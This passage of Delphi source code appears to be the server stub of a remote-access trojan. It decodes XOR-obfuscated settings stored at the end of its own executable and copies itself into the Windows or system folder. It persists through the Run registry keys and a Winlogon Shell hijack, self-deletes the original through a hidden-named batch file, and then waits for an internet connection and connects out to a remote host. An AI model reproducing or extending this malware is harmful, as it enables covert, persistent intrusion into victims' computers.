  For I := 1 To Length(Text) Do
    Begin
      C := Ord(Text[I]);
      Result := Result + Chr((C Xor 12));
    End;
End;

Procedure ReadSettings;
Var
  I             :Word;
  Settings      :String;
  FileContent   :String;
  NewFileName   :String;

Begin
  NewFileName := ParamStr(0)+'_';
  CopyFile(pChar(ParamStr(0)), pChar(NewFileName), False);

  ReadFileStr(NewFileName, FileContent);

  I := Length(FileContent);
  Settings := '';

  While (I > 0) And (FileContent[i] <> #00) Do
  Begin
    Settings := FileContent[i] + Settings;
    Dec(I);
  End;

  If (Settings = '') Then
  Begin
    DeleteFile(pChar(NewFileName));
    Uninstall;
  End;

  Settings := EncryptText(Settings);

  dName         := Copy(Settings, 3, StrToInt(Copy(Settings, 1, 2)));      //x
  Delete        (Settings, 1, StrToInt(Copy(Settings, 1, 2))+2);
  dAName        := Copy(Settings, 3, StrToInt(Copy(Settings, 1, 2)));      //x
  Delete        (Settings, 1, StrToInt(Copy(Settings, 1, 2))+2);
  dSystem       := Copy(Settings, 3, StrToInt(Copy(Settings, 1, 2)));      //x
  Delete        (Settings, 1, StrToInt(Copy(Settings, 1, 2))+2);
  dMelt         := Copy(Settings, 3, StrToInt(Copy(Settings, 1, 2)));      //x
  Delete        (Settings, 1, StrToInt(Copy(Settings, 1, 2))+2);
  dDelay        := Copy(Settings, 3, StrToInt(Copy(Settings, 1, 2)));      //x
  Delete        (Settings, 1, StrToInt(Copy(Settings, 1, 2))+2);
  dPort         := Copy(Settings, 3, StrToInt(Copy(Settings, 1, 2)));      //x
  Delete        (Settings, 1, StrToInt(Copy(Settings, 1, 2))+2);
  dDns          := Copy(Settings, 3, StrToInt(Copy(Settings, 1, 2)));      //x
  Delete        (Settings, 1, StrToInt(Copy(Settings, 1, 2))+2);
  dPass         := Copy(Settings, 3, StrToInt(Copy(Settings, 1, 2)));      //x
  Delete        (Settings, 1, StrToInt(Copy(Settings, 1, 2))+2);
  dRegName      := Copy(Settings, 3, StrToInt(Copy(Settings, 1, 2)));      //x
  Delete        (Settings, 1, StrToInt(Copy(Settings, 1, 2))+2);
  dRegLM        := Copy(Settings, 3, StrToInt(Copy(Settings, 1, 2)));      //x
  Delete        (Settings, 1, StrToInt(Copy(Settings, 1, 2))+2);
  dRegCU        := Copy(Settings, 3, StrToInt(Copy(Settings, 1, 2)));      //x
  Delete        (Settings, 1, StrToInt(Copy(Settings, 1, 2))+2);
  dRegSH        := Copy(Settings, 3, StrToInt(Copy(Settings, 1, 2)));      //x
  Delete        (Settings, 1, StrToInt(Copy(Settings, 1, 2))+2);
  dInject       := Copy(Settings, 3, StrToInt(Copy(Settings, 1, 2)));

  DeleteFile(pChar(NewFileName));
End;

Function GetDirectory(dInt: Integer): String;
Var
  S: Array[0..255] Of Char;
Begin
  Case dInt Of
    0: GetWindowsDirectory(@S, 256);
    1: GetSystemDirectory(@S, 256);
  End;
  Result := String(S)+'\';
End;

Procedure Install;
Var
  Temp  :String;
  F     :TextFile;
Begin
  //Password := dPass;
  //Host := ResolveIP(dDns);
  //Port := StrToInt(dPort);

  Temp := GetDirectory(StrToInt(dSystem)) + dName;
  If (ParamStr(0) = Temp) Then
  Begin
    If (FileExists('C:\'#32'.bat')) Then
      ShellExecute(0, 'open', 'c:\'#32'.bat', nil, nil, 0);
    Exit;
  End;

  If (CopyFile(pChar(ParamStr(0)), pChar(Temp), False)) Then
  Begin
    If (dRegLM = '1') Then SetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', dRegName, Temp);
    If (dRegCU = '1') Then SetRegValue(HKEY_CURRENT_USER,  'Software\Microsoft\Windows\CurrentVersion\Run', dRegName, Temp);
    If (dRegSH = '1') Then SetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft NT\Windows\CurrentVersion\Winlogon', 'Shell', 'Explorer.exe '+Temp);

    If (dMelt = '1') Then
    Begin
      AssignFile(F, 'c:\'#32'.bat');
      ReWrite(F);
      WriteLn(F, 'del "'+ParamStr(0)+'"');
      WriteLn(F, 'del "c:\'#32'.bat"');
      CloseFile(F);
    End;

    If (dDelay = '0') Then
      ShellExecute(0, 'open', pchar(temp), nil, nil, 0);
    If (dMelt = '1') Then
      ShellExecute(0, 'open', 'c:\'#32'.bat', nil, nil, 0);
    ExitProcess(0);
  End;
End;

begin
  //ReadSettings;
  //Install;

  Serv := TServer.Create;
  While Not (InternetGetConnectedState(NIL, 0)) Do Sleep(5000);
  Serv.Connect;
end.
